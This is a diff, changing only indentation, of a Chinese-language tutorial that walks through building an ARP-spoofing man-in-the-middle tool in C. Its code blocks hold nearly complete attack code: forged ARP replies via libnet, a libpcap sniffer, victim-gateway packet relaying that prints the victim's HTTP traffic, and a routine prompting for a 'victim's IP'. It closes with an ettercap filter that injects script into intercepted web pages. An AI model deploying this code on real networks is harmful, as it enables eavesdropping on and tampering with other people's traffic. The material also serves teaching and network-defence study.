@@ -65,9 +65,9 @@ ARP欺骗的实现可以发送伪造的ARP应答包或者请求包，一旦目�
 ```c
 /* ethernet head */
 typedef struct {
-    u_char DST_mac[6];
-    u_char SRC_mac[6];
-    u_short eth_type;
+  u_char DST_mac[6];
+  u_char SRC_mac[6];
+  u_short eth_type;
 } ethernet_header;
 ```
 
@@ -86,15 +86,15 @@ typedef struct {
 ```c
 /* ARP packet head */
 typedef struct {
-    u_short hardware_type;
-    u_short protocol_type;
-    u_char hardware_len;
-    u_char protocol_len;
-    u_short arp_option;
-    u_char src_mac[6];
-    u_char src_ip[4];
-    u_char dest_mac[6];
-    u_char dest_ip[4];
+  u_short hardware_type;
+  u_short protocol_type;
+  u_char hardware_len;
+  u_char protocol_len;
+  u_short arp_option;
+  u_char src_mac[6];
+  u_char src_ip[4];
+  u_char dest_mac[6];
+  u_char dest_ip[4];
 } arp_header;
 ```
 
@@ -119,16 +119,16 @@ IP数据包头部结构如下图
 ```c
 /* ip packet head */
 typedef struct {
-    u_char verson_head;
-    u_char type_of_service;
-    u_short packet_len;
-    u_short packet_id;
-    u_short slice_info;
-    u_char TTL;
-    u_char protocol_type;
-    u_short check_sum;
-    u_char src_ip[4];
-    u_char dest_ip[4];
+  u_char verson_head;
+  u_char type_of_service;
+  u_short packet_len;
+  u_short packet_id;
+  u_short slice_info;
+  u_char TTL;
+  u_char protocol_type;
+  u_short check_sum;
+  u_char src_ip[4];
+  u_char dest_ip[4];
 } ip_header;
 ```
 IP头部，总长度20
@@ -153,14 +153,14 @@ TCP数据包头部结构如下图
 ```c
 /* TCP packet head */
 typedef struct {
-    u_short sour_port;
-    u_short dest_port;
-    u_int sequ_num;
-    u_int ackn_num;
-    u_short header_len_flag;
-    u_short window;
-    u_short check_sum;
-    u_short surg_point;
+  u_short sour_port;
+  u_short dest_port;
+  u_int sequ_num;
+  u_int ackn_num;
+  u_short header_len_flag;
+  u_short window;
+  u_short check_sum;
+  u_short surg_point;
 } tcp_header;
 ```
 
@@ -202,14 +202,14 @@ Ethernet { IP [ TCP ( HTTP ) ] }
 ```c
 /* MITM information */
 typedef struct {
-    u_char *TARGET_MAC;
-    u_char *ATTACKER_MAC;
-    u_char *GATEWAY_MAC;
-    u_char *TARGET_IP;
-    u_char *GATEWAY_IP;
-    char *dev;
-    char *filter;
-    int mode; //模式的选择
+  u_char *TARGET_MAC;
+  u_char *ATTACKER_MAC;
+  u_char *GATEWAY_MAC;
+  u_char *TARGET_IP;
+  u_char *GATEWAY_IP;
+  char *dev;
+  char *filter;
+  int mode; //模式的选择
 } MITM_info;
 ```
 
@@ -274,54 +274,54 @@ pcap_loop的回调函数，hp是一个存放有数据包信息的结构指针，
 ```c
 void Sniffer(const char *filter_exp) {
 
-    /* definations */
-    char *dev;
-    char errbuf[PCAP_ERRBUF_SIZE];
-    u_int mask;
-    u_int net_addr;
-    char *net;
-    char *real_mask;
-    struct in_addr addr_net;
-    pcap_t *handle;
-    struct bpf_program filter;
-    char filter_app[100];
+  /* definations */
+  char *dev;
+  char errbuf[PCAP_ERRBUF_SIZE];
+  u_int mask;
+  u_int net_addr;
+  char *net;
+  char *real_mask;
+  struct in_addr addr_net;
+  pcap_t *handle;
+  struct bpf_program filter;
+  char filter_app[100];
 
-    /* start dev */
-    dev = pcap_lookupdev(errbuf);
-    if (dev == NULL) {
-        printf("%s\n", errbuf);
-        exit(1);
-    }
+  /* start dev */
+  dev = pcap_lookupdev(errbuf);
+  if (dev == NULL) {
+    printf("%s\n", errbuf);
+    exit(1);
+  }
 
-    /* start device */
-    if (pcap_lookupnet(dev, &net_addr, &mask, errbuf) == -1) {
-        printf("%s\n", errbuf); //打印错误信息
-        exit(1); //结束程序
-    }
-    addr_net.s_addr = mask;
-    real_mask = inet_ntoa(addr_net);
-    printf("\nmask: %s\n", real_mask);
-    addr_net.s_addr = net_addr;
-    net = inet_ntoa(addr_net);
-    printf("net: %s\n\n", net);
-    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
-    if (!handle) {
-        printf("%s\n", errbuf);
-        printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
-        exit(1);
-    }
+  /* start device */
+  if (pcap_lookupnet(dev, &net_addr, &mask, errbuf) == -1) {
+    printf("%s\n", errbuf); //打印错误信息
+    exit(1); //结束程序
+  }
+  addr_net.s_addr = mask;
+  real_mask = inet_ntoa(addr_net);
+  printf("\nmask: %s\n", real_mask);
+  addr_net.s_addr = net_addr;
+  net = inet_ntoa(addr_net);
+  printf("net: %s\n\n", net);
+  handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
+  if (!handle) {
+    printf("%s\n", errbuf);
+    printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
+    exit(1);
+  }
 
-    /* filtering */
-    if (filter_exp != NULL) strcpy(filter_app, filter_exp);
-    pcap_compile(handle, &filter, filter_app, 0, *net);
-    pcap_setfilter(handle, &filter);
+  /* filtering */
+  if (filter_exp != NULL) strcpy(filter_app, filter_exp);
+  pcap_compile(handle, &filter, filter_app, 0, *net);
+  pcap_setfilter(handle, &filter);
 
-    /* loop capturing */
-    printf("\nstart sniff:\n\n");
-    pcap_loop(handle, -1, proc_pkt, NULL);
+  /* loop capturing */
+  printf("\nstart sniff:\n\n");
+  pcap_loop(handle, -1, proc_pkt, NULL);
 
-    /* end */
-    pcap_close(handle);
+  /* end */
+  pcap_close(handle);
 }
 ```
 
@@ -330,75 +330,75 @@ void Sniffer(const char *filter_exp) {
 ```c
 /* print ether type */
 void print_type(u_short type) {
-    switch (type) {
-        case EPT_IPv4: printf("eth type: IPv4\n"); break;
-        case EPT_IPv6: printf("eth type: IPv6\n"); break;
-        case EPT_ARP: printf("eth type: ARP\n"); break;
-        case EPT_RARP: printf("eth type: RARP\n"); break;
-        default: printf("eth type: Unknown type\n");
-    }
+  switch (type) {
+    case EPT_IPv4: printf("eth type: IPv4\n"); break;
+    case EPT_IPv6: printf("eth type: IPv6\n"); break;
+    case EPT_ARP: printf("eth type: ARP\n"); break;
+    case EPT_RARP: printf("eth type: RARP\n"); break;
+    default: printf("eth type: Unknown type\n");
+  }
 }
 
 /* print protocol type*/
 void print_protocol(u_char protocol_type) {
-    switch (protocol_type) {
-        case PROTOCOL_TCP: printf("protocol type: TCP\n"); break;
-        case PROTOCOL_UDP: printf("protocol type: UDP\n"); break;
-        default: printf("Unknown type\n");
-    }
+  switch (protocol_type) {
+    case PROTOCOL_TCP: printf("protocol type: TCP\n"); break;
+    case PROTOCOL_UDP: printf("protocol type: UDP\n"); break;
+    default: printf("Unknown type\n");
+  }
 }
 
 /*analyze the packet */
 void proc_pkt(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet) {
 
-    /* settle ethernet */
-    ethernet_header *pEther;
-    ip_header *pIpv4;
-    arp_header *pArp;
-    pEther = (ethernet_header *)packet;
-    printf("-------------------------------------\n");
-    print_type(ntohs(pEther->eth_type));
-    printf("eth src MAC address is: ");
-    print_mac(pEther->SRC_mac);  
-    printf("eth des MAC address is: ");
-    print_mac(pEther->DST_mac);
+  /* settle ethernet */
+  ethernet_header *pEther;
+  ip_header *pIpv4;
+  arp_header *pArp;
+  pEther = (ethernet_header *)packet;
+  printf("-------------------------------------\n");
+  print_type(ntohs(pEther->eth_type));
+  printf("eth src MAC address is: ");
+  print_mac(pEther->SRC_mac);  
+  printf("eth des MAC address is: ");
+  print_mac(pEther->DST_mac);
     
-    /* settle ip */
-    if (ntohs(pEther->eth_type) == EPT_IPv4) {
-        pIpv4 = (ip_header *)(packet + sizeof(ethernet_header));
-        print_protocol(pIpv4->protocol_type);
-        printf("src IP address is: ");
-        print_ip(pIpv4->src_ip);
-        printf("des IP address is: ");
-        print_ip(pIpv4->dest_ip);
+  /* settle ip */
+  if (ntohs(pEther->eth_type) == EPT_IPv4) {
+    pIpv4 = (ip_header *)(packet + sizeof(ethernet_header));
+    print_protocol(pIpv4->protocol_type);
+    printf("src IP address is: ");
+    print_ip(pIpv4->src_ip);
+    printf("des IP address is: ");
+    print_ip(pIpv4->dest_ip);
         
-        /* settle port */
-        if (pIpv4->protocol_type == PROTOCOL_TCP) {
-            tcp_header *pTcp;
-            pTcp = (tcp_header *)(packet + sizeof(ethernet_header) + sizeof(ip_header));
-            printf("src port address is: %hu\n", ntohs(pTcp->sour_port));
-            printf("des port address is: %hu\n", ntohs(pTcp->dest_port));
-        }
-        else if (pIpv4->protocol_type == PROTOCOL_UDP) {
-            udp_header *pUdp;
-            pUdp = (udp_header *)(packet + sizeof(ethernet_header) + sizeof(ip_header));
-            printf("src port address is: %hu\n", ntohs(pUdp->sour_port));
-            printf("des port address is: %hu\n", ntohs(pUdp->dest_port));
-        }
+    /* settle port */
+    if (pIpv4->protocol_type == PROTOCOL_TCP) {
+      tcp_header *pTcp;
+      pTcp = (tcp_header *)(packet + sizeof(ethernet_header) + sizeof(ip_header));
+      printf("src port address is: %hu\n", ntohs(pTcp->sour_port));
+      printf("des port address is: %hu\n", ntohs(pTcp->dest_port));
     }
+    else if (pIpv4->protocol_type == PROTOCOL_UDP) {
+      udp_header *pUdp;
+      pUdp = (udp_header *)(packet + sizeof(ethernet_header) + sizeof(ip_header));
+      printf("src port address is: %hu\n", ntohs(pUdp->sour_port));
+      printf("des port address is: %hu\n", ntohs(pUdp->dest_port));
+    }
+  }
     
-    /* settle arp packet */
-    else if (ntohs(pEther->eth_type) == EPT_ARP) {
-        pArp = (arp_header *)(packet + sizeof(ethernet_header));
-        printf("src MAC address is: ");
-        print_mac(pArp->src_mac);
-        printf("eth des MAC address is: ");
-        print_mac(pArp->dest_mac);
-        printf("src IP address is: ");
-        print_ip(pArp->src_ip);
-        printf("des IP address is: ");
-        print_ip(pArp->dest_ip);
-    }
+  /* settle arp packet */
+  else if (ntohs(pEther->eth_type) == EPT_ARP) {
+    pArp = (arp_header *)(packet + sizeof(ethernet_header));
+    printf("src MAC address is: ");
+    print_mac(pArp->src_mac);
+    printf("eth des MAC address is: ");
+    print_mac(pArp->dest_mac);
+    printf("src IP address is: ");
+    print_ip(pArp->src_ip);
+    printf("des IP address is: ");
+    print_ip(pArp->dest_ip);
+  }
 }
 ```
 
@@ -594,48 +594,48 @@ void Arpspoof(void *ARG) {
 ```c
 int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_char *dstIp, int op) {
 
-    /* definations */
-    libnet_t *net_t = NULL;
-    static u_char padPtr[18];
-    char err_buf[LIBNET_ERRBUF_SIZE];
-    libnet_ptag_t p_tag;
-    int res;
+  /* definations */
+  libnet_t *net_t = NULL;
+  static u_char padPtr[18];
+  char err_buf[LIBNET_ERRBUF_SIZE];
+  libnet_ptag_t p_tag;
+  int res;
 
-    /* start libnet */
-    net_t = libnet_init(LIBNET_LINK_ADV, dev, err_buf);
-    if (net_t == NULL) {
-        printf("libnet start error\n");
-        return 1;
-    }
+  /* start libnet */
+  net_t = libnet_init(LIBNET_LINK_ADV, dev, err_buf);
+  if (net_t == NULL) {
+    printf("libnet start error\n");
+    return 1;
+  }
 
-    /* build ARP */
-    p_tag = libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, MAC_ADDR_LEN, IP_ADDR_LEN, op,
-    srcMac, srcIp, dstMac, dstIp, padPtr, 18, net_t, 0);
-    if (p_tag == -1) {
-        printf("libnet build_arp error\n");
-        libnet_destroy(net_t);
-        return 1;
-    }
-
-    /* build ethernet */
-    p_tag = libnet_build_ethernet(dstMac, srcMac, EPT_ARP, padPtr, 0, net_t, 0);
-    if (p_tag == -1) {
-        printf("libnet build_ethernet error\n");
-        libnet_destroy(net_t);
-        return 1;
-    }
-
-    /* send packet */
-    res = libnet_write(net_t);
-    if (res == -1) {
-        printf("ARP libnet write error\n");
-        libnet_destroy(net_t);
-        return 1;
-    }
-
-    /* success */
+  /* build ARP */
+  p_tag = libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, MAC_ADDR_LEN, IP_ADDR_LEN, op,
+  srcMac, srcIp, dstMac, dstIp, padPtr, 18, net_t, 0);
+  if (p_tag == -1) {
+    printf("libnet build_arp error\n");
     libnet_destroy(net_t);
-    return 0;
+    return 1;
+  }
+
+  /* build ethernet */
+  p_tag = libnet_build_ethernet(dstMac, srcMac, EPT_ARP, padPtr, 0, net_t, 0);
+  if (p_tag == -1) {
+    printf("libnet build_ethernet error\n");
+    libnet_destroy(net_t);
+    return 1;
+  }
+
+  /* send packet */
+  res = libnet_write(net_t);
+  if (res == -1) {
+    printf("ARP libnet write error\n");
+    libnet_destroy(net_t);
+    return 1;
+  }
+
+  /* success */
+  libnet_destroy(net_t);
+  return 0;
 }
 ```
 
@@ -658,38 +658,38 @@ int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_ch
 ```c
 int forward_packet(void *ARG) {
 
-    /* defination */
-    MITM_info arg = *(MITM_info *)ARG;
-    char *dev = arg.dev;
-    char errbuf[PCAP_ERRBUF_SIZE];
-    struct bpf_program filter;
+  /* defination */
+  MITM_info arg = *(MITM_info *)ARG;
+  char *dev = arg.dev;
+  char errbuf[PCAP_ERRBUF_SIZE];
+  struct bpf_program filter;
     
-    /* start dev */
-    dev = pcap_lookupdev(errbuf);
-    if (dev == NULL) {
-        printf("%s\n", errbuf);
-        exit(1);
-    }
-    arg.dev = dev;
+  /* start dev */
+  dev = pcap_lookupdev(errbuf);
+	if (dev == NULL) {
+    printf("%s\n", errbuf);
+    exit(1);
+  }
+  arg.dev = dev;
 
-    /* open device */
-    pcap_t *handle = pcap_open_live(dev, 65535, 1, 0, errbuf);
-    if (!handle) {
-        printf("device open error.\n");
-        exit(1);
-    }
+  /* open device */
+  pcap_t *handle = pcap_open_live(dev, 65535, 1, 0, errbuf);
+  if (!handle) {
+    printf("device open error.\n");
+    exit(1);
+  }
 
-    /* compile filter */
-    pcap_compile(handle, &filter, arg.filter, 1, 0);  
-    pcap_setfilter(handle, &filter);
+  /* compile filter */
+  pcap_compile(handle, &filter, arg.filter, 1, 0);  
+  pcap_setfilter(handle, &filter);
 
-    /* capture packets */
-    pcap_loop(handle, -1, getPacket, (u_char *)&arg);
+  /* capture packets */
+  pcap_loop(handle, -1, getPacket, (u_char *)&arg);
 
-    /* end */
-    pcap_close(handle);
+  /* end */
+  pcap_close(handle);
 
-    return 0;
+  return 0;
 }
 ```
 
@@ -698,32 +698,32 @@ int forward_packet(void *ARG) {
 ```c
 void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) {
 
-    /* get args */
-    MITM_info MITM_arg = *(MITM_info *)arg;
-    int Times = 1;
-    u_short type = EPT_IPv4;
-    char *dev = MITM_arg.dev;
-    u_char *victim_mac = MITM_arg.TARGET_MAC;
-    u_char *gateway_mac = MITM_arg.GATEWAY_MAC;
-    u_char *attacker_mac = MITM_arg.ATTACKER_MAC;
-    u_char *victim_ip = MITM_arg.TARGET_IP;
-    u_char *gateway_ip = MITM_arg.GATEWAY_IP;
+  /* get args */
+  MITM_info MITM_arg = *(MITM_info *)arg;
+  int Times = 1;
+  u_short type = EPT_IPv4;
+  char *dev = MITM_arg.dev;
+  u_char *victim_mac = MITM_arg.TARGET_MAC;
+  u_char *gateway_mac = MITM_arg.GATEWAY_MAC;
+  u_char *attacker_mac = MITM_arg.ATTACKER_MAC;
+  u_char *victim_ip = MITM_arg.TARGET_IP;
+  u_char *gateway_ip = MITM_arg.GATEWAY_IP;
 
-    /* get packet information */
-    ethernet_header *pEther = (ethernet_header *)packet;
-    ip_header *pIpv4 = (ip_header *)(packet + 14);
-    tcp_header *pTcp = (tcp_header *)(packet + 34);
-    char *data = (char *)(packet + 54);
+  /* get packet information */
+  ethernet_header *pEther = (ethernet_header *)packet;
+  ip_header *pIpv4 = (ip_header *)(packet + 14);
+  tcp_header *pTcp = (tcp_header *)(packet + 34);
+  char *data = (char *)(packet + 54);
 
-    /* get packet form victim */
-    if (!memcmp(pEther->SRC_mac, victim_mac, 6)) {
-        char *p = strstr(data, "HTTP");
-        if (p != NULL) printf("%s\n", data);
-        forward(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
-    }
-    else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
-        forward(dev, type, victim_mac, attacker_mac, packet + 14, hp->len - 14, Times);
-    }
+  /* get packet form victim */
+  if (!memcmp(pEther->SRC_mac, victim_mac, 6)) {
+    char *p = strstr(data, "HTTP");
+    if (p != NULL) printf("%s\n", data);
+    forward(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
+  }
+  else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
+    forward(dev, type, victim_mac, attacker_mac, packet + 14, hp->len - 14, Times);
+  }
 }
 ```
 
@@ -734,40 +734,40 @@ void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) 
 ```c
 int forward(char *dev, u_short pro_type, u_char *DST, u_char *SRC, const u_char *payload, int len, int Times) {
 
-    /* definations */
-    libnet_t *net_t = NULL;
-    char errbuf[LIBNET_ERRBUF_SIZE];
-    libnet_ptag_t p_tag;
-    int res;
+  /* definations */
+  libnet_t *net_t = NULL;
+  char errbuf[LIBNET_ERRBUF_SIZE];
+  libnet_ptag_t p_tag;
+  int res;
 
-    /* start libnet */
-    net_t = libnet_init(LIBNET_LINK_ADV, dev, errbuf);
-    if (net_t == NULL) {
-        printf("libnet start error\n");
-        return 1;
-    }
+  /* start libnet */
+  net_t = libnet_init(LIBNET_LINK_ADV, dev, errbuf);
+  if (net_t == NULL) {
+    printf("libnet start error\n");
+    return 1;
+  }
 
-    /* build ethernet */
-    p_tag = libnet_build_ethernet(DST, SRC, pro_type, payload, len, net_t, 0);
-    if (p_tag == -1) {
-        printf("libnet build error\n");
-        libnet_destroy(net_t);
-        return 1;
-    }
-
-    /* send packet */
-    for (int i = 0; i < Times; i++) {
-        res = libnet_write(net_t);
-        if (res == -1) {
-            printf("IP libnet write error\n");
-            libnet_destroy(net_t);
-            return 1;
-        }
-    }
-    
-    /* success */
+  /* build ethernet */
+  p_tag = libnet_build_ethernet(DST, SRC, pro_type, payload, len, net_t, 0);
+  if (p_tag == -1) {
+    printf("libnet build error\n");
     libnet_destroy(net_t);
-    return 0;
+    return 1;
+  }
+
+  /* send packet */
+  for (int i = 0; i < Times; i++) {
+    res = libnet_write(net_t);
+    if (res == -1) {
+      printf("IP libnet write error\n");
+      libnet_destroy(net_t);
+      return 1;
+    }
+  }
+    
+  /* success */
+  libnet_destroy(net_t);
+  return 0;
 }
 ```
 
@@ -780,15 +780,15 @@ int forward(char *dev, u_short pro_type, u_char *DST, u_char *SRC, const u_char 
 首先是获得自己的MAC，用Socket里的icotl函数即可：
 
 ```c
-    /* get attacker's mac */
-    int sockfd;
-    static struct ifreq req;
-    sockfd = socket(PF_INET, SOCK_DGRAM, 0);
-    strcpy(req.ifr_name, dev);
-    ioctl(sockfd, SIOCGIFHWADDR, &req);
-    print_mac((u_char *)req.ifr_hwaddr.sa_data);
-    memcpy(ATTACKER_MAC, (u_char *)req.ifr_hwaddr.sa_data, 6);
-    printf("\n");
+  /* get attacker's mac */
+  int sockfd;
+  static struct ifreq req;
+  sockfd = socket(PF_INET, SOCK_DGRAM, 0);
+  strcpy(req.ifr_name, dev);
+  ioctl(sockfd, SIOCGIFHWADDR, &req);
+  print_mac((u_char *)req.ifr_hwaddr.sa_data);
+  memcpy(ATTACKER_MAC, (u_char *)req.ifr_hwaddr.sa_data, 6);
+  printf("\n");
 ```
 
 目标的MAC可以用ping来实现，而网关直接抓包就好。
@@ -806,138 +806,138 @@ u_char GATEWAY_IP[4];
 
 /* print mac address */
 void print_mac(u_char *mac) {
-    int i;
-    for (i = 0; i < 6; i++) {
-        if (mac[i] < 16) printf("0");
-        printf("%x", mac[i]);
-        if (i < 5) printf(":");
-    }
-    printf("\n");
+  int i;
+  for (i = 0; i < 6; i++) {
+    if (mac[i] < 16) printf("0");
+    printf("%x", mac[i]);
+    if (i < 5) printf(":");
+  }
+  printf("\n");
 }
 
 /* print ip address */
 void print_ip(u_char *ip) {
-    int i;
-    for (i = 0; i < 4; i++) {
-        printf("%d", ip[i]);
-        if (i < 3) printf(".");
-    }
-    printf("\n");
+  int i;
+  for (i = 0; i < 4; i++) {
+    printf("%d", ip[i]);
+    if (i < 3) printf(".");
+  }
+  printf("\n");
 }
 
 /* htoi */
 int htoi(char h) {
-    if ('0' <= h && h <= '9')
-        return h - '0';
-    else
-        return h - 'a' + 10;
+  if ('0' <= h && h <= '9')
+    return h - '0';
+  else
+    return h - 'a' + 10;
 }
 
 /* get mac address */
 void get_mac(u_char *mac, char *str) {
-    mac[0] = htoi(str[0]) * 16 + htoi(str[1]);
-    mac[1] = htoi(str[3]) * 16 + htoi(str[4]);
-    mac[2] = htoi(str[6]) * 16 + htoi(str[7]);
-    mac[3] = htoi(str[9]) * 16 + htoi(str[10]);
-    mac[4] = htoi(str[12]) * 16 + htoi(str[13]);
-    mac[5] = htoi(str[15]) * 16 + htoi(str[16]);
+  mac[0] = htoi(str[0]) * 16 + htoi(str[1]);
+  mac[1] = htoi(str[3]) * 16 + htoi(str[4]);
+  mac[2] = htoi(str[6]) * 16 + htoi(str[7]);
+  mac[3] = htoi(str[9]) * 16 + htoi(str[10]);
+  mac[4] = htoi(str[12]) * 16 + htoi(str[13]);
+  mac[5] = htoi(str[15]) * 16 + htoi(str[16]);
 }
 
 /* get gatway's mac */
 void getgateway(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet) {
-    ethernet_header *pEther = (ethernet_header *)packet;
-    printf("The gateway's MAC address is : ");
-    print_mac(pEther->SRC_mac);
-    memcpy(GATEWAY_MAC ,pEther->SRC_mac, 6);
-    printf("\n");
+  ethernet_header *pEther = (ethernet_header *)packet;
+  printf("The gateway's MAC address is : ");
+  print_mac(pEther->SRC_mac);
+  memcpy(GATEWAY_MAC ,pEther->SRC_mac, 6);
+  printf("\n");
 }
 
 void Getinfo(MITM_info *arg) {
 
-    /* definations */
-    char *dev;
-    char errbuf[PCAP_ERRBUF_SIZE];
-    u_int mask;
-    u_int net_addr;
-    char *net;
-    char *real_mask;
-    struct in_addr addr_net;
-    pcap_t *handle;
+  /* definations */
+  char *dev;
+  char errbuf[PCAP_ERRBUF_SIZE];
+  u_int mask;
+  u_int net_addr;
+  char *net;
+  char *real_mask;
+  struct in_addr addr_net;
+  pcap_t *handle;
 
-    /* start dev */
-    dev = pcap_lookupdev(errbuf);
-    if (dev == NULL) {
-        printf("%s\n", errbuf);
-        exit(1);
-    }
+  /* start dev */
+  dev = pcap_lookupdev(errbuf);
+  if (dev == NULL) {
+    printf("%s\n", errbuf);
+    exit(1);
+  }
 
-    /* open device */
-    if (pcap_lookupnet(dev, &net_addr, &mask, errbuf) == -1) {
-        printf("%s\n", errbuf); //打印错误信息
-        exit(1); //结束程序
-    }
-    addr_net.s_addr = net_addr;
-    net = inet_ntoa(addr_net);
-    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
-    if (!handle) {
-        printf("%s\n", errbuf);
-        printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
-        exit(1);
-    }
+  /* open device */
+  if (pcap_lookupnet(dev, &net_addr, &mask, errbuf) == -1) {
+    printf("%s\n", errbuf); //打印错误信息
+    exit(1); //结束程序
+  }
+  addr_net.s_addr = net_addr;
+  net = inet_ntoa(addr_net);
+  handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
+  if (!handle) {
+    printf("%s\n", errbuf);
+    printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
+    exit(1);
+  }
 
-    /* get attacker's mac */
-    int sockfd;
-    static struct ifreq req;
-    sockfd = socket(PF_INET, SOCK_DGRAM, 0);
-    strcpy(req.ifr_name, dev);
-    ioctl(sockfd, SIOCGIFHWADDR, &req);
-    print_mac((u_char *)req.ifr_hwaddr.sa_data);
-    memcpy(ATTACKER_MAC, (u_char *)req.ifr_hwaddr.sa_data, 6);
-    printf("\n");
+  /* get attacker's mac */
+  int sockfd;
+  static struct ifreq req;
+  sockfd = socket(PF_INET, SOCK_DGRAM, 0);
+  strcpy(req.ifr_name, dev);
+  ioctl(sockfd, SIOCGIFHWADDR, &req);
+  print_mac((u_char *)req.ifr_hwaddr.sa_data);
+  memcpy(ATTACKER_MAC, (u_char *)req.ifr_hwaddr.sa_data, 6);
+  printf("\n");
 
-    /* enter victim's ip */
-    printf("Please enter your victim's IP (format: 192.168.1.0)\n");
-    scanf("%hhd.%hhd.%hhd.%hhd", &TARGET_IP[0], &TARGET_IP[1], &TARGET_IP[2], &TARGET_IP[3]);
+  /* enter victim's ip */
+  printf("Please enter your victim's IP (format: 192.168.1.0)\n");
+  scanf("%hhd.%hhd.%hhd.%hhd", &TARGET_IP[0], &TARGET_IP[1], &TARGET_IP[2], &TARGET_IP[3]);
 
-    /* enter gatewat's ip */
-    printf("Please enter your gateway's IP (format: 192.168.1.0)\n");
-    scanf("%hhd.%hhd.%hhd.%hhd", &GATEWAY_IP[0], &GATEWAY_IP[1], &GATEWAY_IP[2], &GATEWAY_IP[3]);
+  /* enter gatewat's ip */
+  printf("Please enter your gateway's IP (format: 192.168.1.0)\n");
+  scanf("%hhd.%hhd.%hhd.%hhd", &GATEWAY_IP[0], &GATEWAY_IP[1], &GATEWAY_IP[2], &GATEWAY_IP[3]);
 
-    /* get attack resource */
-    printf("\nGetting your victim's MAC......\n");
-    char ip[20], ping[40] = "ping -c 3 > data/ping.txt ", arp[30] = "arp -e > data/arp.txt ", data[300];
-    sprintf(ip,"%d.%d.%d.%d", TARGET_IP[0], TARGET_IP[1], TARGET_IP[2], TARGET_IP[3]);
-    strcat(ping, ip), system(ping);
-    strcat(arp, ip), system(arp);
-    FILE* fp = fopen("data/arp.txt", "r");
-    fgets(data, 300, fp);
-    fgets(data, 300, fp);
-    char *p = strstr(data, "ether");
-    if (p == NULL) {
-        printf("Not found!\n");
-        exit(1);
-    }
-    get_mac(TARGET_MAC, p + 8);
-    printf("His MAC is: ");
-    print_mac(TARGET_MAC);
-    printf("\n");
+  /* get attack resource */
+  printf("\nGetting your victim's MAC......\n");
+  char ip[20], ping[40] = "ping -c 3 > data/ping.txt ", arp[30] = "arp -e > data/arp.txt ", data[300];
+  sprintf(ip,"%d.%d.%d.%d", TARGET_IP[0], TARGET_IP[1], TARGET_IP[2], TARGET_IP[3]);
+  strcat(ping, ip), system(ping);
+  strcat(arp, ip), system(arp);
+  FILE* fp = fopen("data/arp.txt", "r");
+  fgets(data, 300, fp);
+  fgets(data, 300, fp);
+  char *p = strstr(data, "ether");
+  if (p == NULL) {
+    printf("Not found!\n");
+    exit(1);
+  }
+  get_mac(TARGET_MAC, p + 8);
+  printf("His MAC is: ");
+  print_mac(TARGET_MAC);
+  printf("\n");
 
-    /* get gateway's mac */
-    printf("Geting gateway's MAC\n");
-    struct bpf_program filter;
-    char filter_app[20] = "src ";
-    char gateway[15];
-    sprintf(gateway, "%d.%d.%d.%d", GATEWAY_IP[0], GATEWAY_IP[1], GATEWAY_IP[2], GATEWAY_IP[3]);
-    strcat(filter_app, gateway);
-    pcap_compile(handle, &filter, filter_app, 0, *net);
-    pcap_setfilter(handle, &filter);
-    pcap_loop(handle, 1, getgateway, NULL);
-    arg->TARGET_IP = TARGET_IP;
-    arg->TARGET_MAC = TARGET_MAC;
-    arg->ATTACKER_MAC = ATTACKER_MAC;
-    arg->GATEWAY_IP = GATEWAY_IP;
-    arg->GATEWAY_MAC = GATEWAY_MAC;
-    pcap_close(handle);
+  /* get gateway's mac */
+  printf("Geting gateway's MAC\n");
+  struct bpf_program filter;
+  char filter_app[20] = "src ";
+  char gateway[15];
+  sprintf(gateway, "%d.%d.%d.%d", GATEWAY_IP[0], GATEWAY_IP[1], GATEWAY_IP[2], GATEWAY_IP[3]);
+  strcat(filter_app, gateway);
+  pcap_compile(handle, &filter, filter_app, 0, *net);
+  pcap_setfilter(handle, &filter);
+  pcap_loop(handle, 1, getgateway, NULL);
+  arg->TARGET_IP = TARGET_IP;
+  arg->TARGET_MAC = TARGET_MAC;
+  arg->ATTACKER_MAC = ATTACKER_MAC;
+  arg->GATEWAY_IP = GATEWAY_IP;
+  arg->GATEWAY_MAC = GATEWAY_MAC;
+  pcap_close(handle);
 }
 ```
 
@@ -1004,18 +1004,18 @@ ettercap的过滤脚本语法如下：
 ```js
 if (ip.proto == TCP && tcp.dst == 80)
 {
-    if (search(DATA.data, "Accept-Encoding"))
-    {
-        replace("Accept-Encoding", "Accept-Rubbish!");
-        msg("zapped Accept-Encoding!\n");
-    }
+  if (search(DATA.data, "Accept-Encoding"))
+  {
+    replace("Accept-Encoding", "Accept-Rubbish!");
+    msg("zapped Accept-Encoding!\n");
+  }
 }
 
 if (ip.proto == TCP && tcp.src == 80)
 {
-    replace("<head>", "<head><script type=\"text/javascript\">alert('Big brother is watching at you');</script>");
-    replace("<HEAD>", "<HEAD><script type=\"text/javascript\">alert('Big brother is watching at you');</script>");
-    msg("Injecting OK!!\n");
+  replace("<head>", "<head><script type=\"text/javascript\">alert('Big brother is watching at you');</script>");
+  replace("<HEAD>", "<HEAD><script type=\"text/javascript\">alert('Big brother is watching at you');</script>");
+  msg("Injecting OK!!\n");
 }
 ```
 
